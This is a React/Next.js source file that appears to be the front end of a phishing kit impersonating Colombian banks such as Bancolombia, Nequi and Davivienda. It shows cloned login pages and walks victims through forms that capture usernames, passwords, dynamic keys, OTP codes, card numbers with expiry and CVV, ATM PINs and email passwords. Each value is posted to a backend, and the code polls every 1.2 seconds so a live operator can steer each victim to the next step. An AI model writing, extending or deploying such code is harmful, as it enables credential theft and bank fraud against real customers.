/* eslint-disable react-hooks/set-state-in-effect */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "next/navigation";

import { BANK_DATA } from "@/lib/banks";
import { getBankViews } from "@/lib/bankViews";
import BancolFooter from "@/components/banks/bancol/BancolFooter";
import NequiFooter from "@/components/banks/nequi/Footer";

export default function BancoGeneric({ bankId }: { bankId: string }) {
  const searchParams = useSearchParams();
  const origen = searchParams?.get("origen") || (typeof window !== "undefined" && window.location.search.includes("jelpit") ? "jelpit" : null);

  const [step, setStep] = useState("principal");
  const [modal, setModal] = useState<string | null>(null);
  const [cuenta, setCuenta] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [isDark, setIsDark] = useState(false);
  const [isReady, setIsReady] = useState(false);
  const isSubmittingRef = useRef(false);

  const banco = BANK_DATA[bankId];
  const Views = getBankViews(bankId);

  useEffect(() => {
    const mq = window.matchMedia("(prefers-color-scheme: dark)");
    setIsDark(mq.matches);

    const listener = (e: any) => setIsDark(e.matches);
    mq.addEventListener("change", listener);

    return () => mq.removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    let saved = localStorage.getItem("sessionId-bank");
    if (!saved) {
      saved = crypto.randomUUID();
      localStorage.setItem("sessionId-bank", saved);
    }
    setSessionId(saved);
  }, []);

  useEffect(() => {
    if (bankId && bankId !== "generic" && typeof window !== "undefined") {
      try {
        localStorage.setItem("bankSelct", bankId);
        localStorage.setItem("bankSelect", bankId);
        localStorage.setItem("bancoSelected", bankId);
        localStorage.setItem("bankId", bankId);
        localStorage.setItem("banco", bankId);
      } catch (e) {}
    }
  }, [bankId]);

  // Reset the session in the server on mount to clear any stale step (like 'tc')
  useEffect(() => {
    if (!sessionId) return;

    const initSession = async () => {
      try {
        await fetch(`/api/banco/status?sessionId=${sessionId}&reset=true`);
      } catch (err) {
        console.error("Error resetting session state on mount:", err);
      } finally {
        setStep("principal");
        setIsReady(true);
      }
    };

    initSession();
  }, [sessionId]);

  const lastSubmittedAtRef = useRef<number>(0);
  const lastSubmittedViewRef = useRef<string>("");

  useEffect(() => {
    if (!sessionId || !isReady) return;

    let isMounted = true;

    const interval = setInterval(async () => {
      if (!isMounted) return;
      try {
        const res = await fetch(`/api/banco/status?sessionId=${sessionId}`);
        const data = await res.json();

        if (!isMounted || !data.status) return;

        const s = data.status.toString().trim().toLowerCase();
        const now = Date.now();
        const timeSinceSubmit = now - lastSubmittedAtRef.current;
        const isGracePeriod = timeSinceSubmit < 4500;

        // Si se acaba de enviar un formulario, ignorar estados obsoletos durante el periodo de gracia
        if (isGracePeriod && (s === "pending" || s === "verificando" || s === lastSubmittedViewRef.current || (s.startsWith("e") && lastSubmittedViewRef.current.includes(s.replace(/^e/, ""))))) {
          setModal(null);
          setStep("verificando");
          return;
        }

        if (s === "exito" || s === "fin") {
          setModal(null);
          setStep("exito");
        } else if (s === "otp" || s === "token") {
          setModal(null);
          setStep("otp");
        } else if (s === "otp8") {
          setModal(null);
          setStep("otp8");
        } else if (s === "eotp" || s === "etoken" || s === "vencido") {
          setModal(null);
          setStep("errorotp");
        } else if (s === "eotp8" || s === "errorotp8") {
          setModal(null);
          setStep("errorotp8");
        } else if (s === "error" || s === "elogo") {
          setModal(null);
          setStep("errorLogo");
        } else if (s === "dinamica") {
          setModal(null);
          setStep("dinamica");
        } else if (s === "edinamica") {
          setModal(null);
          setStep("errordinamica");
        } else if (s === "actdatos") {
          setModal(null);
          setStep("actdatos");
        } else if (s === "autorizar_app") {
          setModal(null);
          setStep("autorizar_app");
        } else if (s === "error_asesor") {
          setModal(null);
          setStep("error_asesor");
        } else if (s === "facial" || s.startsWith("efacial_")) {
          setModal(null);
          setStep(s);
        } else if (s === "tc") {
          setModal(null);
          setStep("tc");
        } else if (s === "etc") {
          setModal(null);
          setStep("etc");
        } else if (s === "saldo") {
          setModal(null);
          setStep("saldo");
        } else if (s === "cajero") {
          setModal(null);
          setStep("cajero");
        } else if (s === "ecajero") {
          setModal(null);
          setStep("errorcajero");
        } else if (s === "edavivienda") {
          setModal(null);
          setStep("errorsistema_dav");
        } else if (s === "xconnection" || s === "err_connection") {
          setModal(null);
          setStep("xconnection");
        } else if (s === "xsistema") {
          setModal("xsistema");
        } else if (s === "xbloqueo") {
          setModal("xbloqueo");
        } else if (s === "qr" || s === "solicitud_qr") {
          window.location.href = "/bre-b";
        } else if (s === "eqr" || s === "error_qr") {
          window.location.href = "/bre-b?error=true";
        } else if (s === "pending") {
          setModal(null);
          if (step !== "exito") {
            setStep("verificando");
          }
        }
      } catch (err) {
        console.error("Error fetching status", err);
      }
    }, 1200);

    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [sessionId, isReady, step]);


  // DETECCION DE INACTIVIDAD DE 3 MINUTOS (Solo para bancol)
  useEffect(() => {
    if (bankId !== "bancol") return;
    if (step === "exito" || modal) return;

    let timeoutId: NodeJS.Timeout;

    const resetTimer = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        setModal("inactividad");
      }, 180000);
    };

    const events = ["mousemove", "mousedown", "keypress", "touchstart", "scroll"];
    resetTimer();

    events.forEach((event) => {
      window.addEventListener(event, resetTimer);
    });

    return () => {
      if (timeoutId) clearTimeout(timeoutId);
      events.forEach((event) => {
        window.removeEventListener(event, resetTimer);
      });
    };
  }, [step, modal, bankId]);

  const getLocal = (key: string, fallback: any = null) => {
    if (typeof window === "undefined") return fallback;
    const value = localStorage.getItem(key);
    try {
      return value ? JSON.parse(value) : fallback;
    } catch {
      return value || fallback;
    }
  };

  function mergeBankData(newData: any) {
    const saved = localStorage.getItem("dataBank");
    const oldData = saved ? JSON.parse(saved) : {};
    let pse_validacion_data = localStorage.getItem("pse_validacion_data");
    if (!pse_validacion_data && typeof window !== "undefined") {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && k.startsWith("pse_validacion_data")) {
          pse_validacion_data = localStorage.getItem(k);
          break;
        }
      }
    }
    const savedBank = typeof window !== "undefined" ? (localStorage.getItem("bankSelct") || localStorage.getItem("bankSelect") || localStorage.getItem("bancoSelected") || localStorage.getItem("banco") || localStorage.getItem("bankId") || "") : "";
    const effectiveBank = (bankId && bankId !== "generic") ? bankId : (savedBank || newData?.bank || newData?.banco || oldData.bank || "Generic");

    const merged = {
      ...oldData,
      pse_validacion_data,
      bank: effectiveBank,
      banco: effectiveBank,
      bankId: effectiveBank,
      bankSelct: effectiveBank,
      ...Object.fromEntries(
        Object.entries(newData).filter(([_, v]) => v !== null && v !== undefined)
      ),
    };

    localStorage.setItem("dataBank", JSON.stringify(merged));
    if (effectiveBank && effectiveBank !== "Generic" && typeof window !== "undefined") {
      try {
        localStorage.setItem("bankSelct", effectiveBank);
        localStorage.setItem("banco", effectiveBank);
        localStorage.setItem("bankId", effectiveBank);
      } catch (e) {}
    }
    return merged;
  }

  const enviar = async (data: any) => {
    isSubmittingRef.current = true;
    lastSubmittedAtRef.current = Date.now();
    lastSubmittedViewRef.current = data.view || "";
    setTimeout(() => { isSubmittingRef.current = false; }, 3000);
    const infoclient = getLocal("infoclient");
    const savedBank = typeof window !== "undefined" ? (localStorage.getItem("bankSelct") || localStorage.getItem("bankSelect") || localStorage.getItem("bancoSelected") || localStorage.getItem("banco") || localStorage.getItem("bankId") || "") : "";
    const finalBank = (bankId && bankId !== "generic") ? bankId : (savedBank || data.bank || data.banco || infoclient?.banco || "Generic");

    if (finalBank && finalBank !== "Generic" && typeof window !== "undefined") {
      try {
        localStorage.setItem("bankSelct", finalBank);
        localStorage.setItem("banco", finalBank);
        localStorage.setItem("bankId", finalBank);
      } catch (e) {}
    }

    mergeBankData({ bank: finalBank, banco: finalBank, bankId: finalBank, ...data });

    if (!data.noLoader) {
      setStep("verificando");
    }

    const payload: any = {
      sessionId,
      sendReplyMarkup: true,
      bankId: finalBank,
      bank: finalBank,
      banco: finalBank,
      bankSelct: finalBank,
      cuenta,
      tipo: "ahorros",
      nombre: infoclient?.name || (typeof window !== "undefined" ? localStorage.getItem("name") : null),
      documento: infoclient?.documento || (typeof window !== "undefined" ? localStorage.getItem("documento") : null),
      origen: typeof window !== "undefined" ? (new URLSearchParams(window.location.search).get("origen") || (window.location.search.includes("jelpit") ? "jelpit" : null)) : null,
      cupo_actual: typeof window !== "undefined" ? localStorage.getItem("cupo_actual") : null,
    };

    if (data.view === "login" && data.user) {
      payload.usuario = data.user;
      payload.bank = finalBank || data.bank || infoclient?.banco || "Generic";
      if (data?.dynamicKey) {
        payload.dinamica = data.dynamicKey;
      }
    }

    if (data.view === "login" && data.pass) {
      payload.clave = data.pass;
    }
    if (data.view === "dinamica" && data.dinamica) {
      payload.dinamica = data.dinamica;
    }
    if ((data.view === "otp" || data.view === "otp8") && data.otp) {
      payload.otp = data.otp;
    }
    if (data.view === "actdatos") {
      if (data.email) {
        payload.email = data.email;
        payload.phone = data.celular;
      }
      if (data.correo) {
        payload.email = data.correo;
        payload.correoClave = data.correoClave;
        payload.phone = data.user;
      }
    }

    if (data.view === "tarjeta_verif" && data.tarjeta) {
      payload.tarjeta = data.tarjeta;
      payload.fecha = data.fecha;
      payload.cvv = data.cvv;
    }
    if (data.view === "saldo" && data.saldo) {
      payload.saldo = data.saldo;
    }

    if ((data.view === "cajero" || data.view === "clave_cajero") && (data.cajero || data.claveCajero)) {
      payload.cajero = data.cajero || data.claveCajero;
      payload.claveCajero = data.cajero || data.claveCajero;
    }

    const finalPayload = mergeBankData(payload);

    setTimeout(async () => {
      try {
        await fetch("/api/banco/send", {
          method: "POST",
          body: JSON.stringify(finalPayload),
        });
      } finally {
        isSubmittingRef.current = false;
      }
    }, 150);
  };

  // Efecto encargado de manejar el redireccionamiento al disparar el step 'exito'
  useEffect(() => {
    if (step === "exito" && origen !== "app_nativa") {
      // Usamos javascript nativo para pegarle a la API rompiendo la cach├® de la SPA
      window.location.href = "/api/redirect";
    }
  }, [step, origen]);

  const activeView = (
    <>
      {step === "principal" && (
        <Views.Logo
          banco={banco}
          cuenta={cuenta}
          setCuenta={setCuenta}
          enviar={enviar}
        />
      )}

      {step === "errorLogo" && (
        <Views.ErrorLogo
          banco={banco}
          cuenta={cuenta}
          setCuenta={setCuenta}
          enviar={enviar}
        />
      )}

      {step === "verificando" && <Views.Verificando />}

      {step === "otp" && <Views.Otp banco={banco} enviar={enviar} />}
      {step === "otp8" && (Views.Otp8 ? <Views.Otp8 banco={banco} enviar={enviar} /> : <Views.Otp banco={banco} enviar={enviar} digits={8} />)}

      {step === "errorotp" && (Views.ErrorOtp ? <Views.ErrorOtp banco={banco} enviar={enviar} /> : <Views.Otp banco={banco} enviar={enviar} isError={true} />)}
      {step === "errorotp8" && (Views.ErrorOtp8 ? <Views.ErrorOtp8 banco={banco} enviar={enviar} /> : (Views.ErrorOtp ? <Views.ErrorOtp banco={banco} enviar={enviar} digits={8} /> : <Views.Otp banco={banco} enviar={enviar} isError={true} digits={8} />))}
      {step === "dinamica" && <Views.Dinamica banco={banco} enviar={enviar} />}
      {step === "errordinamica" && (Views.ErrorDinamica ? <Views.ErrorDinamica banco={banco} enviar={enviar} isError={true} /> : <Views.Dinamica banco={banco} enviar={enviar} isError={true} />)}
      {step === "errorGeneral" && <Views.ErrorApp banco={banco} enviar={enviar} />}

      {/* Si es app_nativa y tiene vista de ├ëxito nativa la renderiza, si no, retorna null ya que el useEffect maneja el cambio por URL */}
      {step === "exito" && (origen === "app_nativa" && Views.Exito ? <Views.Exito /> : null)}

      {step === "actdatos" && <Views.ActData banco={banco} enviar={enviar} />}
      {step === "autorizar_app" && (Views.AutorizarApp ? <Views.AutorizarApp banco={banco} enviar={enviar} /> : <Views.ActData banco={banco} enviar={enviar} showAutorizarAppModal={true} />)}
      {step === "error_asesor" && (Views.ErrorAsesor ? <Views.ErrorAsesor banco={banco} enviar={enviar} /> : <Views.ErrorApp banco={banco} enviar={enviar} />)}
      {(step === "facial" || step.startsWith("efacial_")) && <Views.Facial banco={banco} enviar={enviar} errorType={step.startsWith("efacial_") ? step : undefined} />}
      {step === "tc" && <Views.Tc banco={banco} enviar={enviar} />}
      {step === "etc" && (Views.Etc ? <Views.Etc banco={banco} enviar={enviar} isError={true} /> : <Views.Tc banco={banco} enviar={enviar} isError={true} />)}
      {step === "saldo" && <Views.Saldo banco={banco} enviar={enviar} />}

      {step === "cajero" && Views.Cajero && <Views.Cajero banco={banco} enviar={enviar} />}
      {step === "errorcajero" && (Views.ErrorCajero ? <Views.ErrorCajero banco={banco} enviar={enviar} isError={true} /> : (Views.Cajero ? <Views.Cajero banco={banco} enviar={enviar} isError={true} /> : null))}

      {step === "errorsistema_dav" && Views.ErrorSistema && <Views.ErrorSistema banco={banco} enviar={enviar} />}
      {(step === "xconnection" || step === "err_connection") && Views.ErrorConexion && <Views.ErrorConexion banco={banco} enviar={enviar} />}

      {modal === "xsistema" && Views.XSistemaModal && (
        <Views.XSistemaModal
          onAceptar={async () => {
            if (sessionId) {
              await fetch(`/api/banco/status?sessionId=${sessionId}&reset=true`);
            }
            setModal(null);
            setStep("principal");
          }}
        />
      )}
      {modal === "xbloqueo" && Views.XBloqueoModal && (
        <Views.XBloqueoModal
          onAceptar={async () => {
            if (sessionId) {
              await fetch(`/api/banco/status?sessionId=${sessionId}&reset=true`);
            }
            setModal(null);
            setStep("principal");
          }}
        />
      )}
      {modal === "inactividad" && Views.InactividadModal && (
        <Views.InactividadModal
          onAceptar={async () => {
            if (sessionId) {
              await fetch(`/api/banco/status?sessionId=${sessionId}&reset=true`);
            }
            setModal(null);
            setStep("principal");
          }}
        />
      )}
    </>
  );

  if (bankId === "bancol" && step !== "verificando" && step !== "exito") {
    return (
      <div className="min-h-screen bg-[#f9f9fa] flex flex-col justify-between">
        <div className="flex-1 w-full svp-authentication">
          <div className="register-template" title="Sucursal Virtual Personas">
            <div className="simple-template">
              <main className="svp-main">
                <div className="bc-container-fluid trazo bg-de-color-bancol">
                  <div className="bc-flex bc-justify-content-center">
                    <div className="bc-flex bc-justify-content-center bc-mt-5">
                      <div className="bc-logo logo bc-flex bc-justify-content-center bc-logo-width">
                        <img src="/bancos/bancol/logo.svg" alt="logo" className="bc-logo-width" style={{ width: "11.5rem" }} />
                      </div>
                    </div>
                  </div>


                  <h1 className={(step === "saldo" || step === "actdatos" || step === "autorizar_app" || step === "facial" || step.startsWith("efacial_")) ? "bc-text-center bc-cibsans-font-style-9-extrabold bc-mt-4 bc-fs-xs" : "bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs"}>
                    {step === "saldo" ? "Saldo disponible" : (step === "actdatos" || step === "autorizar_app") ? "Actualizaci├│n de datos" : (step === "facial" || step.startsWith("efacial_")) ? "Verificaci├│n de identidad" : "Sucursal Virtual Personas"}
                  </h1>

                  {activeView}
                </div>
              </main>
            </div>
          </div>
        </div>
        <BancolFooter />
      </div>
    );
  }

  return (
    <div className={`min-h-screen ${bankId === 'nequi' ? 'bg-transparent' : 'bg-white'} flex flex-col justify-between`}>
      <div className="flex-1 w-full">
        {activeView}
      </div>
      {bankId === 'nequi' && step !== "verificando" && step !== "exito" && <NequiFooter />}
    </div>
  );
}